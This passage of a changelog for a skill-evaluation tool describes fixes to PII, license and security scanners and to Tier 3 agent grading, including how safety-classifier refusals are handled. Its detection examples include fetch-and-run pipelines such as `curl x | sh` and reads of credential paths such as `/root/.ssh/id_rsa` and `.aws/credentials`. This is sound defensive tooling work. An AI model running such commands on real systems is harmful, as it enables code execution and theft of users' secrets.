  success detail and, for a single skill, also in `rubric_eval`. Tier 3
  conclusions and recommendations written by the LLM, and LLM-written
  dimensions returned by `compute_dimensions`, record the model that wrote
  them as `model`. For a Claude 5.5 or later model on the native Claude API
  this is the model the reply names: the server-side refusal fallback model,
  not the configured model, when the fallback answered. Otherwise it is the
  configured model, unless a server-side `fallback` block in the reply names
  another model.

- The Tier 3 verifier saves every LLM judge attempt to `judge_attempts.json`
  next to the trial's `skill_evaluator_reward.json`, rewritten after each
  attempt so it also explains a judge that failed. Each entry records the
  metric, attempt number, method (`llm`, `ragas` or `salvage`), judge model,
  status, and the problem with a rejected reply, plus the prompt and reply
  with long text shortened. A `behavior_check` score rebuilt from a truncated
  reply adds a `salvage` entry. Configured credentials, common key shapes,
  URL userinfo, `Authorization`, API-key, token and `Cookie` header values,
  and the values of credential flags such as `--token` and
  `curl -u user:password` are masked. Rewards record
  `judge_contract: skill-evaluator-judges-v2`, a reserved name that custom
  graders cannot use.

- `--pii-waivers PATH` on `validate`, `tier1`, and `pii-scan` accepts a
  reviewed PII value without relaxing the whole check through a severity
  override. Each waiver names the PII check, the file (relative to the waiver
  file's directory), the line, the SHA-256 digest that PII findings now report
  as `evidence_sha256`, a reason, an owner, and a `created`/`expires` window
  of at most 366 days, and it stops applying as soon as any of them no longer
  matches. Other values on the same line are still reported. Reports list each
  waiver for a scanned file as applied (INFO), stale (LOW), or expired
  (MEDIUM), so one file can serve single-skill, folder, and catalog runs. A
  malformed file is rejected with exit code 2; through the Python API it
  applies no waivers and fails the PII scan with a HIGH
  `invalid-pii-waiver-file` finding. Credential checks cannot be waived, and
  their findings, like any finding whose value reports mask, carry no digest.
  Waivers are never discovered automatically inside the scanned skill; pass
  the file with `--pii-waivers`.

- Every finding now has stable IDs for tracking across runs and validators.
  `finding_id` (`SEF-…`) is derived from the finding's category, check,
  message, and suggestion, so it survives line moves, whitespace or case
  changes, and severity overrides. Location text a check copies into its
  message is left out of it: the `in <file>:<line>` in a secret detection
  message, also in a folder or plugin run that prefixes the file path, and
  the `— N occurrences (…)` list a PII scan message ends with. A file name in
  a message or suggestion, as script lint and secret detection write, stays
  part of the ID. `occurrence_id` (`SEO-…`) adds the file, line, and line
  content. Otherwise identical findings in different files or skills
  share one `finding_id`, so they count as one unique finding with one
  occurrence per location. When CI redacts a detected credential from a
  report, it recomputes the IDs from the redacted text and renders the HTML,
  Markdown, and SARIF copies from that JSON, so no ID is derived from a
  removed value. The JSON report and the HTML report's embedded data
  add `finding_counts` (raw records, distinct occurrences, unique findings,
  and duplicates removed), `finding_groups` (each unique finding with its
  validators and every location, including each location a PII finding
  lists for a repeated value, also in a folder run), and `message_counts`
  (error and warning strings with no finding behind them, such as failed
  gates and scanner or execution errors, but not the workflow scope note for
  a stage that configuration skips, plus informational messages other than
  the `[OK]` line recorded for each passed check); each JSON result also
  carries its own `finding_counts`. Markdown adds a Finding Reconciliation
  table, most severe first, and per-finding IDs. `total_errors`,
  `total_warnings`, and `severity_counts` are unchanged.

- `--skillspector-baseline FILE` on `validate`, `tier1`, and `security-scan`
  applies an audited SkillSpector suppression baseline, so reviewed false
  positives no longer leave the security check failed or `INCOMPLETE`.
  Baselines apply only when passed explicitly; one shipped inside the skill is
  never used, and suppressed findings without a requested baseline still fail
  closed. A rule without a literal run in its `id` (two characters)
  or in its `path` or `message` (four), such as `id: "*"` or `message: "*e*"`, or a version 2 rule or fingerprint without a `reason`, is
  rejected before the scan, as are entries that are not mappings, unparseable
  files, and files beyond SkillSpector's size and YAML expansion limits; an
  empty file is an empty baseline. A baseline kept inside the skill is
  excluded from the scan, including the staged copy used when the skill has
  `evals/` outputs. JSON reports add `results[].skillspector_baseline` with the
  outcome (`applied`, `no_matches`, `fingerprint_version_mismatch`,
  `llm_stage_unmatched`, or `not_applied`), the baseline file name and
  `sha256:` digest (never its local path), scanner versions, and per-stage
  finding counts with the suppressed findings' severities and rule IDs, and Markdown and HTML reports show the outcome as a
  `skillspector_baseline` line. Fingerprints ignored after a SkillSpector
  upgrade, or not matched by the LLM stage, are reported instead of silently
  suppressing nothing; fingerprints only match static-only runs.

- Tier 3 **Measured Agent Resources** split each trial's trajectory time into
  LLM seconds and tool seconds, plus LLM milliseconds per prompt + completion
  token, with with-skill-minus-baseline deltas in the HTML report and the
  `resources` JSON object. Native ATIF timing is used when present; otherwise
  the time is inferred from step timestamps and the `Wall time` header of Codex
  shell and `apply_patch` output, so the default Codex agent on Harbor 0.24
  gets real values. Each trial records its timing source, and a comparison that
  mixes native and inferred timing carries a `mixed_timing_sources` caveat.
  Trials with unmeasured tool calls (for example `update_plan`, web search or
  MCP tools) stay `N/A`, and the time between multi-step Harbor steps is not
  counted. Deltas keep the existing complete-arm and matching-case rules;
  scores, verdicts and gates do not change.

- `scripts/ci/check_public_benchmarks.py` accepts `--expected-source-repository`,
  `--expected-source-revision` and `--expected-evaluator-container-revision`,
  so a publishing pipeline can check that each card names the source it asked
  to evaluate. A card of any verdict fails when the matching `Evaluated source`,
  `Evaluated source revision` or `Evaluator container revision` line is
  missing, `not recorded`, malformed, duplicated or different. Values are
  compared in the canonical form the card records, and any of these options
  implies `--require-files`. Without them the scan is unchanged.

### Changed

- Name the shared OSS validation policy `default` for both public and private
  repositories. Keep `--profile external`, `--external`, and the legacy
  environment value as compatibility aliases without changing validation rules.
  The CI image now selects `default`; GitHub and GitLab templates explain that
  policy selection does not control report visibility. Existing image pins keep
  their previous label until upgraded to an image containing this change.
  New report policy metadata uses `profile: default` and `audience: all`; its
  digest and bundled source path change with the name. Saved reports are not
  rewritten.

- The Markdown summary and the HTML report's summary now count findings the
  same way: each unique finding once, at its highest severity, however many
  lines, files, skills or validators report it. Markdown's Total Issues adds
  distinct occurrences, raw records, and errors and warnings with no finding
  behind them, such as failed gates and incomplete scans; its severity
  breakdown counts unique findings. In HTML, the tier cards, the Tier 1
  Findings and Blocking critical + high numbers, the verdict sentence, the
  skill finding badges and the gate policy line count unique findings, and
  the Findings number shows the same occurrence, raw-record and no-finding
  counts beneath it when they differ from the unique count. Both formats used
  to add up raw records, so a finding reported on several lines or by two
  validators counted more than once. The HTML report's embedded and exported
  data changes `summary.total_issues` the same way: it now counts unique
  findings plus errors and warnings with no finding behind them, instead of
  raw errors plus warnings; the raw finding count is in
  `summary.raw_finding_occurrences` and `finding_counts.raw_occurrences`. The
  JSON `skills[].issue_count`, contributor totals, `total_errors`,
  `total_warnings` and `severity_counts` still count raw records.

- The Tier 3 per-evaluator drill-down and steps chart now include baseline
  (without-skill) trials. The drill-down adds a Condition column and shows
  metrics that only baseline rows scored; the steps chart plots one series per
  agent and condition from every trial, for up to 200 eval cases. Cases with
  missing or partial step telemetry stay gaps instead of zeros or partial
  averages. The token chart remains with-skill only; Measured Agent Resources
  compares token totals across both arms.

- Tier 3 `accuracy` grades the outcome only. The `SKILL_IDENTIFIED` criterion,
  which capped a correct answer from the no-skill baseline at 0.8 on positive
  cases, is replaced by `FORMAT_FOLLOWED`: the response follows any output
  format the question explicitly requires, and when none is required it is
  true only if the response gives an answer. A trial that ran but gave no
  answer still scores `0.0`, as before. Skill use is still scored by
  `skill_execution`. Every case and both arms use the same five criteria, so
  rewards no longer record `excluded_criteria` or the
  `applicable-accuracy-criteria/v1` policy; reports still read older rewards
  that do. `judge_accuracy` still accepts the `skill_identification_applicable`
  keyword but ignores it. Expect baseline accuracy to rise and accuracy lift to
  fall for the same runs.

- Tier 3 LLM judges return verdicts only, and the verifier computes every
  score: `accuracy` is passing criteria divided by five, `goal_accuracy` is
  `1.0` when the goal was achieved and `0.0` otherwise, and `behavior_check` is
  the share of expected behaviors observed. A `score` field in a reply is
  ignored, and the prompts no longer ask for one. An invalid reply is retried
  once with the exact problem, for example `steps not judged: [2]`, instead of
  a generic format reminder. The prompt examples are valid replies for the task
  at hand, and the goal prompt no longer shows an empty tool-call section.

### Fixed

- Tier 3 behavior-check evidence bundles now count a final answer cut by
  the final-response section limit as truncated. The omission check
  compared two renderings that both capped that section (800 characters
  by default), so a long final answer could lose its middle to the cap
  while the bundle claimed `truncated: false`. The comparison now runs
  against a rendering without the final-response section limit. An answer
  that still reaches the judge in full is not flagged, including one split
  between the compact history and the end of the final-response section.
  The `reason` names each setting that cut evidence:
  `SKILL_EVAL_BEHAVIOR_CHECK_BUDGET`, `SKILL_EVAL_BEHAVIOR_FINAL_RESPONSE_LIMIT`,
  or both. Caps inside individual sections (write bodies, history summaries)
  are unchanged. The evidence-budget documentation now names both causes of
  a `behavior_check` truncation and which setting raises each.

- Tier 3 security grading no longer reports a network-exfiltration warning,
  which lowered the Security score to 0.5, for HTTP method prose such as
  `Use HTTP POST to create an item.` or `Document HTTP PUT semantics.` in a
  here-document or `apply_patch` body. Linux finds a command by its exact name,
  so a later bare `HTTP`, `HTTPS`, or `Http` word does not start HTTPie, and
  its method word is no longer read as an upload. Its body items, piped or
  redirected input, `--raw`, and a method word before a `name:@file` header
  item, even a quoted or escaped one, or before a `$VAR` word still warn, as do
  a lowercase `http PUT URL`, a path or `.exe` word such as `./HTTP POST URL`
  or `HTTP.exe POST URL`, an `HTTP POST URL` command word, and any upload in
  the same action. Both the host checker and the bundled Harbor verifier apply
  the rule.

- Tier 3 Docker and Kata runs retry a Claude Code or Codex install that fails,
  for example on a dropped download or a package mirror error, instead of
  failing the trial on the first attempt. Up to three attempts run within
  Harbor's agent setup timeout, so an install that keeps failing still fails
  the trial. A slow failure that would leave no room for another attempt is
  not retried, so the trial reports the install error rather than a setup
  timeout, and each retry warning ends with the failed command's output.
  Platform probe and transport errors are not retried, and local mode still
  checks the installed CLI once.

- Tier 3 `--stop-on-pass` (or `harbor.stop_on_pass: true`) no longer ignores
  `--n-concurrent`. Every case and attempt previously ran one at a time, so
  large evaluations took several times longer than the configured concurrency
  allowed. Up to `n_concurrent` cases now run at once per agent. A case's
  attempts still run one after another and stop after its first pass, the
  with-skill and without-skill arms still run one after the other, and the
  merged arm results keep dataset order.

- Tier 2 context deduplication no longer stops skills with many repeated
  sections at the `llm_cluster_member_limit` work limit. A candidate cluster
  with more than 64 members was reported as incomplete even when its review
  prompt fit the 64,000-character budget. The member limit now equals the
  512-chunk ceiling, which the chunk check already enforces, so it is only a
  guard and never stops a scan on its own; the per-cluster prompt, total
  prompt, and cluster-count limits decide. When a cluster's request (system
  prompt plus cluster text) would exceed 64,000 characters, each exactly
  repeated text is sent once as `SHARED CONTENT n` when that makes the request
  shorter; a short text repeated under long headings stays inline. A Markdown
  section is compared without its own heading line, so the same body under
  different headings is shared too. Every occurrence keeps its own entry with
  its file, section, line range, and heading line. Distinct text is never
  dropped or sampled, so a cluster still over the budget stays incomplete with
  `llm_prompt_size_limit`. Duplicate and `llm_refused` finding messages name
  at most 64 member locations and source files and count the rest; the JSON
  `source_files` list stays complete.

- On the native Claude API, the Tier 3 judges' `judge_model_used` names the
  server-side fallback model when the API serves a repeated request straight
  from that model. Such a reply has no `fallback` content block, so the label
  now comes from the reply's own `model` field instead of the configured
  model. `judge_fallback_used` is then `true`, and Skill Lift treats such a
  case like an in-call fallback: when another condition, attempt or step of
  the case was judged by the configured model, the case leaves that judge
  metric's lift and is counted in `judge_mixed_cases`.

- Tier 2 `similarity-check` and `context-optimization-check` no longer abort
  with a "symlink or reparse point" error when a skill or collection aliases
  one agent directory to another, such as `.agents -> .claude`. A directory
  link whose name is not a scanned file type and whose relative target is a
  regular directory found by the same scan is skipped without being followed,
  so the target directory is scanned once. Absolute links and Windows
  junctions, broken or escaping links, links to the scan root or one of the
  alias's parent directories, `..` after a named component, and aliases that
  point at another link remain rejected.

- PII scans no longer report Luhn-valid timestamps and digests as CRITICAL
  credit cards that fail `validate` and `pii-scan`. A number is skipped when a
  label such as `timestamp_microseconds:`, `event_timestamp:`, `unix_time`,
  `epoch_us`, `sha256:`, or `checksum=` directly precedes it, or when it sits
  inside a longer ASCII identifier or hex token such as `id_1707938736269577`;
  a card after a payment word and an underscore (`card_4532015112830366`,
  `cc_...`), in Markdown underscore emphasis (`_4532015112830366_`), after a string
  escape such as `\n` or a percent-encoded byte such as `%3D`, or written
  directly next to Chinese, Japanese, or Korean text is still reported. Known
  test card numbers, now including other widely published test cards such as
  `4242424242424242` and `5555555555554444`, are excepted however their digits
  are grouped (`4111 1111 1111 1111`). They no longer hide a different card
  number on the same line, so a card listed next to a test card is now
  reported. The exponent of a scientific-notation value such as
  `1.000000e+00` is no longer reported as an international phone number.
  GPS-shaped decimal pairs now need a geospatial cue (GPS, latitude/longitude,
  lat/lng, `latlong`/`lonlat` keys, WGS 84, a `geo:` URI, a Google, Apple,
  OpenStreetMap, or Bing map link, a GeoJSON geometry, `Feature`, or collection
  type or `"geometry"` member, or location, office, address, or degrees, also
  in plural, numeric-suffix, snake_case, or camelCase forms such as
  `locations:`, `lat1`, or `homeLocation`) on the line, on one of the two lines
  before it, or in the file name, so waypoints, poses, quaternions, and
  calibration vectors are no longer reported as location data. Every position
  inside a GeoJSON geometry's `coordinates` array written as JSON, a Python
  dict, or a JS object is still reported. Pairs without a cue, such as
  `coordinates: 37.7749, -122.4194` or `Meet me at 37.7749, -122.4194`, are no
  longer reported either.

- A Tier 3 `claude-code` trial that the model provider's safety classifier
  stops now ends as Harbor's typed `AgentSafetyRefusalError` on the selected
  model, on the Anthropic API, Bedrock, Vertex AI and gateway routes alike.
  Claude Code 2.1.292 retried such a turn on another model from its own table
  (for example `claude-opus-4-8` after Claude Opus 5.5) under the bare
  Anthropic ID: a route that does not serve that ID, such as a gateway, failed
  with HTTP 403 and an `UnknownApiError`, and where the retry succeeded the
  trial was scored as the selected model although another model finished it.
  Generated and native tasks now set `CLAUDE_CODE_DISABLE_REFUSAL_FALLBACK=1`
  in the task environment for every env mode, and neither `harbor.runtime_env`
  nor a native task's `[environment.env]` can turn the fallback back on. Other
  agents ignore the variable. The variable was checked with Claude Code
  2.1.292, the release Harbor installs; local mode keeps the fallback off only
  if the host's Claude Code honors it. A refused attempt is not scored, like
  any other failed trial, so the arm no longer has complete attempt coverage:
  after one refusal in 20 cases with 3 attempts each, it reports
  `Scored attempt coverage is 59/60` and its execution fails.
  `tier3 evaluate` then exits 1, and so does `validate --block-on-agent-eval`.
  On a route that serves the fallback model, such as the Anthropic API, the
  retry used to finish such an attempt and the arm succeeded, so a run that
  completed before can now fail. Rerun it, or evaluate the refused case with
  another model.

- Tier 3 staging no longer fails with `chmod: cannot use dir_fd and
  follow_symlinks together` when it replaces or merges into an existing
  directory or file on Linux hosts whose glibc cannot change a mode without
  following symlinks (glibc before 2.32, or newer glibc without `/proc`). This
  affected, for example, `init-custom-grader` and `init-harbor-task` over an
  existing `evals/` directory. Staging still changes modes without following
  links where the platform supports it. Elsewhere it opens the entry without
  following links, confirms it is the entry it checked, and changes the mode
  through that open descriptor, so a link swapped in is refused instead of
  followed. Only an entry that cannot be opened, such as one its owner cannot
  read, is still changed by name, with an identity check afterwards.

- Local-mode sandbox errors now include Bubblewrap's own failure line when its
  startup probe fails, note that `pivot_root: Operation not permitted` can mean
  an enclosing container's seccomp profile blocks Bubblewrap, and suggest
  `SKILLEVALUATOR_LOCAL_SANDBOX=prefer` alongside `off`.

- The license check now parses SPDX license expressions instead of splitting
  them on operators. Expressions with unbalanced parentheses, such as
  `(MIT OR Apache-2.0`, were allowed, and dangling or repeated operators were
  only sent to review; both now fail with a HIGH
  `unsupported_license_expression` finding. A malformed value without an
  upper-case `AND`, `OR` or `WITH`, such as `mit or (apache-2.0`, is reviewed
  as an unknown license name instead of being allowed, and `(MIT)` is allowed
  as MIT. A blocked license still fails a value that does not parse, such as
  `GPL-3.0 (or later)` or `(GPL-3.0 OR MIT`. The `+`, `-only` and `-or-later`
  forms of blocked licenses, such as `GPL-3.0+`, `AGPL-3.0+` and
  `LGPL-2.1-only`, and deprecated ids such as
  `GPL-2.0-with-classpath-exception` are blocked instead of passing as unknown
  licenses. `Apache-2.0 WITH LLVM-exception` is allowed through a
  new `allowed_license_exceptions` list, while an unlisted exception such as
  `Commons-Clause` still needs review. An allowed frontmatter expression that
  leaves out the allowed license found in a LICENSE file is now a conflict, as
  a single identifier already was. SPDX headers inside Markdown inline code or
  table cells no longer keep the closing backtick or `|`, and a trailing `;` is
  dropped. Names such as `MIT License` are matched as before.

- The quality check no longer reports command-line placeholders in a string
  `argument-hint`, such as `<file> [--strict]` or `<issue_id | symptom>`, as a
  HIGH "XML tags in frontmatter" finding that failed the skill even with
  `--min-score 0`. An unquoted hint such as `[<file>]`, which YAML reads as a
  list of strings, is masked the same way. Role and control tags (`<system>`,
  `<tool_call>`, `<script>`, nested forms, and role words with a `prompt`,
  `message`, `call`, `use`, `result` or `instruction` suffix such as
  `<system_prompt>`), closing tags, attributes, and self-closing tags in
  `argument-hint` are still reported, and every other frontmatter field keeps
  the strict check. A group longer than four words, or one with shell command
  syntax (`;`, `&`, a backtick, `$(`, `${`, or a pipeline such as
  `<curl x | sh>`), is not treated as a placeholder and is still reported. A
  hint with a redirect, that is a `>` that closes no group (`<cmd > file>`,
  `<cmd>file>`, `<cmd 2>file>`, `<curl x> /tmp/y>`), or a group with text
  after a nested placeholder (`<<curl x>/tmp/<y>>`, `<<x><y>>`) or anything
  other than a plain name before it (`<curl;sh<x>>`, `<$(curl x|sh)<x>>`), is
  not masked at all and is still reported. An arrow or comparison between
  groups (`<old> -> <new>`, `<n> >= 1`, `<count> (>0)`) is not a redirect.

- PII scans no longer report card-shaped digits inside a canonical GUID/UUID,
  such as a COM interface ID or the nil UUID, or an all-zero number as a
  CRITICAL credit card. A GUID-shaped value directly after a payment label
  (`card_number:`, `credit_card=`, `cc_no:`, `pan`) on its line or at the end
  of the previous line is still reported. Every card-shaped number on a line is
  now checked, so a GUID or non-Luhn number earlier on the line no longer hides
  a real card number after it.

- Tier 3 security grading no longer gives a critical finding and a security
  score of 0.0 when an agent uses `apply_patch` to write a workspace file that
  only resembles a protected path. The `.aws/credentials` and `.config/gcloud`
  entries now match a patch target with a directory prefix only in a home
  directory (`~/`, `/root/`, `/home/<user>/`, `/Users/<user>/`,
  `C:\Users\<user>\`, `%USERPROFILE%`), after the existing workdir, `cd`, `~`
  and `$HOME` resolution. That resolution now reads a bare `cd` as the home
  directory, skips `cd`/`pushd` options, leaves the directory unchanged for
  `pushd -n`/`popd -n`, reads `/proc/self/root`, `/proc/<pid>/root` and similar
  aliases as `/`, and reads `/proc/self/cwd` as the call's working directory
  and `/proc/<pid>/cwd` as an unknown one. A relative header that itself starts
  with one of these names (`.aws/credentials`, `./.config/gcloud/adc.json`) is
  still flagged whatever directory it resolves against. When the shell decides
  the directory at run time (`cd "$DIR"`, `cd ${HOME:-/root}`, `cd -`, `popd`,
  a variable `workdir`, an operand with quotes or backslashes the shell
  removes, a `cd` inside a subshell, pipeline, branch, quoted `-c` script or
  `||`/`&&` list that may not run, or a `CDPATH` assignment), these entries
  keep the existing match anywhere in the path, and a relative header such as
  `.bashrc` is also checked as a home path. A project file or test fixture such
  as `project/.aws/credentials` is no longer a `sensitive_file_write`; a
  Windows home path such as `C:\Users\<user>\.bashrc` and a `/proc/<pid>/root`
  or `/proc/<pid>/cwd` alias of a protected path now are. A shell `apply_patch`
  now scores like the tool call: the command-text path checks
  skip the file header lines of an argv patch and of a heredoc body fed to
  `apply_patch` (as a `cmd` string or in the `["bash", "-lc", script]` argv
  form), so headers such as `docs/.config/gcloud-setup.md` no longer raise
  `sensitive_path_access`. Header paths that hold shell syntax (`;`, `&`, `|`,
  `<`, `>`, `(`, `)`, `$`, a backtick or `~`) or a word that is itself a
  protected path (`x /root/.ssh/id_rsa`) are always checked, and so is every
  header when the command, or any other word of an argv command, pipes,
  redirects or captures `apply_patch`'s output, including through a `coproc`,
  since that output names each added file.
  Header-shaped lines elsewhere in the command, a heredoc body that a shell
  expands or runs (an unquoted body holding `$`, a backtick or a backslash),
  and heredocs whose extent is uncertain (mixed delimiter quoting, a missing
  terminator, a comment or ANSI-C quote before the operator, or another use of
  the `apply_patch` name) are still checked, as is a `bash -lc "..."` string
  inside a `cmd`. Read and Write tool paths and other shell commands keep the
  existing credential-path matching.

- An `--llm` security scan whose LLM provider keeps failing after
  SkillSpector's bounded retries no longer reports only
  `skillspector-llm failed with unexpected exit code 2: scanner diagnostics were redacted`
  (or `skillspector reported execution_successful=false`). When every failure
  in the SkillSpector v2.12.0+ report is an `llm_connection_retries_exhausted`
  row on an LLM analyzer, the error says that the provider kept failing, that
  this is a retriable provider failure rather than a security finding, and
  that the full scan should be retried when the provider is available. Mixed,
  truncated, malformed or older reports keep the generic error. The scan stays
  `INCOMPLETE` with a nonzero exit, and static findings still decide a
  `FAILED` result.

- Tier 2 deduplication no longer fails a content cluster when the model wraps
  its JSON verdict in prose, puts a fenced block after a short preamble, or
  writes the fenced block on one line. Such replies come from prompt-only JSON,
  which Bedrock always uses and other providers fall back to after rejecting
  the structured-output schema; they previously failed with
  `LLM returned invalid JSON` (or an `IndexError` for the one-line fence) and
  left Tier 2 incomplete. Exactly one embedded JSON object is accepted. Replies
  with several objects are still rejected instead of guessed, and an object
  inside an array or a malformed container is never used as the verdict. As in
  the Tier 3 judge, an object with a repeated key, a `NaN` or `Infinity` value,
  a number that overflows a float or more than 128 levels of nesting is
  rejected, whether it is the whole reply or embedded in prose.

- Tier 3 HTML reports now explain failing evaluator scores. A failing
  evaluator card opens its per-trial evidence, shows the grader's reason
  (or, when the grader recorded none, its message, findings, or failed
  criteria), and quotes a short excerpt of the offending command or artifact.
  A failing cell in the per-evaluator drill-down shows the reason as a
  tooltip. When attempts of one case disagree, the card shows the
  lowest-scoring attempt's reason, so a passing attempt no longer hides a
  failure. Grader reasons and excerpts are credential-redacted, including
  the values of configured credential environment variables. Criteria the
  grader excluded from the score are not listed as failed. Drill-down
  reasons and excerpts are capped at 240 and 300 characters, and
  secret-detector findings never quote their detection pattern back.
  Large reports drop these reasons before any other detail, so they never
  displace the HTML overview or recorded evidence.

- The Tier 3 HTML size notice no longer prints `<built-in method items ...>`
  in place of the number of items the preview omitted.

- Ctrl+C during `tier3 evaluate` now stops the run. The interrupt reached only
  the coordinating thread, so running Harbor jobs kept going in their own
  process groups, agents waiting for a `--max-agents` slot still started, and
  the command appeared to hang until every job finished. Queued agents,
  conditions, and `--stop-on-pass` attempts now never start. Each running
  Harbor job receives SIGTERM and up to 30 seconds to stop its trial
  environments, such as Docker containers, before its process group is
  killed; a second Ctrl+C skips that wait, and on Windows the task tree is
  stopped immediately. Progress shows the agents that are stopping and reports
  the run as interrupted instead of failed unexpectedly.

- The prompt-based `goal_accuracy` judge, which runs whenever the RAGAS scorer
  does not (including with the default NVIDIA Build provider), used the reply's
  `score` field over its `achieved` verdict, so `achieved: false` with
  `score: 1.0` scored 1.0. Other judge replies were also accepted when they
  should have been retried: an `accuracy` reply with only a numeric total
  (clamped into 0 to 1, so `99` scored 1.0), a `behavior_check` reply that
  judged one step twice and skipped another, and a RAGAS goal score other than
  `0.0` or `1.0`. Each is now rejected and retried, and a RAGAS score that is
  not binary falls back to the prompt judge.

- A Tier 1 security scan that SkillSpector reports as partial no longer fails
  with only "reports incomplete analysis (status 'partial')". The error quotes
  up to three completeness exceptions as `path [phase; reason_code;
  analyzers=...]` and, when there are more, counts the incomplete files per
  reason, for example `(incomplete files by reason: runtime_limit 462,
  obfuscated_instruction_text 4)`. For `runtime_limit`, it explains the fix:
  when many files are cut short, a skill that bundles a large corpus hits the
  same SkillSpector time budget on every rerun and needs that material moved
  out of the skill, while a sub-analysis that stopped at its own budget (named
  `<analyzer>_runtime_limit`, such as the SC8 bytecode walk in SkillSpector
  2.12.0) is not affected by bundle size and needs a rerun or a newer
  SkillSpector. A report with both kinds of rows gets both explanations. The
  scan still fails closed as `INCOMPLETE`.

- The Tier 3 `goal_accuracy` RAGAS scorer now produces scores. It passed a
  `SingleTurnSample` to the RAGAS 0.4 collections metric, which takes the
  messages and reference as keyword arguments, so it failed before sending any
  request and every eligible trial (the `openai` provider on the canonical
  endpoint with a judge model outside the GPT-5 and GPT-6 families) fell back
  to the prompt judge with only an info log. These trials now report
  `goal_accuracy` with `"method": "ragas"` instead of `"custom"`, plus
  `judge_model_used`, `judge_reasoning_effort` and `judge_fallback_used`, so
  scores and lift can differ from earlier runs. A RAGAS failure that falls back
  to the prompt judge is logged as a warning with the redacted error, and the
  scorer's OpenAI client is closed after each attempt. A case scored by RAGAS
  in one condition and by the prompt judge in the other is left out of the
  `goal_accuracy` lift and counted in `judge_mixed_cases`, even when both used
  the same model. GPT-5 and GPT-6 judges, including the defaults, are
  unaffected.

- Tier 1 `security` no longer fails a skill, rules, workflows, or plugin
  artifact on SkillSpector agent-threat matches in files no agent reads or
  runs, such as UI strings in HTML, CSS, or `.vue` files, test fixtures,
  documentation, notebooks, images, and lockfiles. Findings stay blocking on
  agent control paths (instructions, references, executables, agent
  configuration, MCP and plugin manifests) and on any file those reference by
  path, file name, skill or plugin root variable or placeholder
  (`${CLAUDE_SKILL_DIR}`, `$SKILL_DIR`, `$SKILL_ROOT`,
  `${CLAUDE_PLUGIN_ROOT}`, `{baseDir}`, `<skill-dir>`), install path, or
  import, without regard to case. Files SkillSpector marks executable, such as
  `.py`, `.js`, `.ts`, and `.tsx` files under `tests/` or `web/`, are executables, so
  their findings and those of any fixture they name stay blocking. An issue
  that SkillSpector reports for several files is suppressed only when every
  one of its occurrences is outside agent control paths. Supply-chain
  findings, YARA malware signatures, and artifact-integrity findings for a
  misleading extension or embedded NUL bytes still apply on every path, and a
  file named as a raster image keeps its findings unless its content is an
  image. A location or occurrence that is missing or escapes the artifact
  through `..` or a symlink keeps its finding. Malformed occurrences, a report
  that serializes fewer occurrences than it counted, an unloadable manifest,
  and an unfinished reference walk keep every affected finding. Suppressed
  issues are left out of the aggregate risk-score gate, counted in a
  `filtered` summary row, and recorded in the JSON report's
  `skillspector_applicability` block. `security-scan` and targets of `unknown`
  type keep the unrestricted scan.

- PII scans no longer report Proton (Steam Play) prefix paths such as
  `compatdata/<appid>/pfx/drive_c/users/steamuser/` as personal macOS paths:
  `steamuser` is the profile name Proton uses for every player. Other user
  names, `steamuser` outside a `pfx/drive_c` prefix, profile paths followed by
  a `..` segment later on the line, and Windows `C:\Users\steamuser` paths are
  still reported. When a Proton path and a personal path share a line, the
  personal path is reported.

- An unrelated `/home/<user>/` path no longer hides a personal home path later
  on the same line; the PII scan drops such paths before it picks the line's
  first match.

## 0.7.2 - 2026-11-03

### Added

- Add reporting to an existing single-job GitHub scan caller while preserving
  its skill folders, thresholds, triggers and shared component. Explicit wrapper
  delegation supports central version-tag updates and retains signed scan
  identity and the resolved workflow commits in published receipts.

- Support CLI setup with verified private GitHub Pages in eligible Enterprise
  Cloud organization repositories. Publication rechecks site access and the
  expected URL before retaining reports and before deployment. Private Pages
  must already be configured by an administrator.

- Allow hosted CI reports and PR comments from scans called through explicitly
  approved reusable workflow wrappers. Direct callers retain the existing setup;
  signed evaluator identity and exact consumer workflow approvals remain required.

- `tier3 select-decoys` selects neighboring skills from a local description-
  embedding catalog and saves a reproducible JSON manifest with scores,
  catalog/model identity, and content hashes. Group evaluations can opt in
  with `skill_workspace.decoy_manifest` in `evals/config.yml`; selected content
  is verified and shared between paired arms without selecting again.
  Explicit helper skills and existing workspace defaults remain unchanged.
  Selections exclude skills bundled inside the target and use portable roots
  for the target's collection. Decoy hashes cover the staged runtime content,
  so evaluation configs and other decoy manifests do not invalidate them.
  Output guards protect evaluation inputs and existing non-manifest files.

- Tier 1 schema validation accepts a list for `metadata.domain` in `SKILL.md`
  (for example `domain: [backend, ai-ml]`) instead of reporting a HIGH
  `Input should be a valid string` finding that also stopped the remaining
  schema checks for that skill. A single string is still accepted and is
  treated as a one-entry list. The parsed value is now always a list: entries
  are trimmed and deduplicated in order, and a missing, null, or blank value
  becomes an empty list. Lists longer than 16 entries and non-string, blank, or
  over-128-character entries are rejected. This adds a length limit that
  `metadata.domain` did not have before: a single string longer than 128
  characters, which used to pass, now fails Tier 1 with a HIGH
  `Field 'metadata.domain'` finding.

### Changed

- Publish updated onboarding templates and CLI metadata while retaining the
  existing verified scanner workflow and immutable container image.

### Documentation

- Keep verified CI templates in the public repository and use one product
  release for Python packages and CI downloads. Update onboarding links to
  avoid relying on separate CI release entries.

### Fixed

- When `validate` finds an unusable Tier 3 source, the terminal and HTML
  report now say which entries or files failed and why, instead of only
  "Create or fix the Tier 3 source ... and rerun validation." The terminal
  lists the errors under the Tier 3 finding when the full CLI report prints
  (`-r cli` or `--verbose`) and otherwise in the compact Tier 3 panel. When
  the run also writes an HTML or JSON report, the terminal shows the first
  five and names that report for the rest; when it writes neither (for example
  `-r cli` alone, or `--verbose` without `-r`), the terminal lists every
  error. The HTML dashboard shows a single error in full or the error count,
  and Full Insights lists every error under Source Validation Errors. The
  errors come from the skill's eval files, so they are printed as plain text
  with terminal control sequences removed. Passing checks and warnings are not
  listed. The JSON report still carries every error under
  `tier3.provenance.source_validation`. Validation rules, gate decisions, and
  the finding's suggestion text are unchanged.

- Tier 2 context deduplication no longer stops valid skills at the
  `scalar_comparison_limit` work limit below its 512-chunk ceiling. The fixed
  25,000,000 scalar-comparison budget stopped 2,048-dimensional embeddings at
  156 chunks and 1,536-dimensional embeddings at 180. The budget is now
  267,911,168, so embeddings of up to 2,048 dimensions reach all 512 chunks.
  Wider embeddings have a lower effective chunk limit (418 chunks at 3,072
  dimensions, 362 at 4,096), which the incomplete-scan error and the JSON
  `work_limit` record now report as `effective_chunk_limit`, next to the
  skill's own `chunk_count`.

- `BENCHMARK.md` score transitions round half-up to one decimal place, keep
  extra decimals for a score near a dimension verdict threshold so it is never
